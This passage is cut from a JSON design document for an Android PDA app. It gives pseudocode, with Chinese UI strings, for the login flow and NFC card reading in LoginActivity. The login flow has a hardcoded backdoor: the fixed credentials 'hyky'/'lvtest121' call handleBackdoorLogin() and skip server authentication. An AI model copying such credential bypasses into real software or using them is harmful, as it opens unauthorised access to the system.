        "  username = usernameEdit.getText().trim()",
        "  password = passwordEdit.getText().trim()",
        "  ",
        "  IF username IS EMPTY:",
        "    SHOW ERROR '请输入用户名'",
        "    FOCUS usernameEdit",
        "    RETURN",
        "  ",
        "  IF password IS EMPTY:",
        "    SHOW ERROR '请输入密码'",
        "    FOCUS passwordEdit",
        "    RETURN",
        "  ",
        "  CLEAR errors",
        "  DISABLE loginButton",
        "  SHOW '登录中...'",
        "  ",
        "  deviceId = sessionManager.getDeviceId()",
        "  securityResult = securityManager.checkLoginSecurity(username, deviceId)",
        "  ",
        "  IF securityResult.isAbnormal():",
        "    SHOW ERROR securityResult.getReason()",
        "    RESET loginButton",
        "    RETURN",
        "  ",
        "  IF username == 'hyky' AND password == 'lvtest121':",
        "    handleBackdoorLogin()",
        "    RETURN",
        "  ",
        "  networkAuthService.login(username, password, callback):",
        "    ON SUCCESS(userInfo, message):",
        "      securityManager.recordLoginSuccess(username, deviceId)",
        "      sessionManager.startSession(userInfo)",
        "      permissionManager.cacheUserPermissions(userInfo)",
        "      SHOW SUCCESS message",
        "      DefaultLocationManager.refreshFromServer()",
        "      navigateToMainActivity()",
        "    ",
        "    ON FAILURE(errorMessage):",
        "      securityManager.recordLoginFailure(username, deviceId)",
        "      SHOW ERROR friendlyErrorMessage(errorMessage)",
        "      RESET loginButton"
      ]
    },
    {
      "id": "handle_nfc_tag_pseudocode",
      "name": "NFC标签处理伪代码",
      "code_ref": {
        "file": "/Users/dm/code/PDA/app/src/main/java/com/pda/hcw/LoginActivity.java",
        "method": "handleNFCTag",
        "lines": "615-709"
      },
      "pseudocode": [
        "FUNCTION handleNFCTag(tag):",
        "  LOG '检测到NFC标签'",
        "  ",
        "  IF statusText CONTAINS '失败' OR '重试':",
        "    UPDATE statusText TO '正在读取NFC卡片...'",
        "    SHOW progressBar",
        "  ",
        "  TRY:",
        "    rawBytes = tag.getId()",
        "    ",
        "    // 反转字节顺序",
        "    reversedBytes = REVERSE(rawBytes)",
        "    ",
        "    tagId = bytesToHex(reversedBytes)",
        "    decimalCardNumber = convertHexToDecimalCardNumber(tagId)",
        "    ",
        "    LOG '原始字节: ' + rawBytes",
        "    LOG '反转后字节: ' + reversedBytes",
        "    LOG '标签ID: ' + tagId",
        "    LOG '10进制卡号: ' + decimalCardNumber",
        "    ",
        "    techType = detectTechType(tag.getTechList())",
        "    ",
        "    UPDATE UI:",
        "      DELAY 200ms:",
        "        statusText = '读取成功！ID: ' + decimalCardNumber + ' 类型: ' + techType",
        "        validateNFCCard(decimalCardNumber, techType)",
        "  ",
        "  CATCH Exception:",
        "    LOG ERROR '处理NFC标签失败'",
        "    statusText = '读取NFC标签失败'",
        "    DELAY 1s: isProcessingNFCTag = false"
      ]
    },
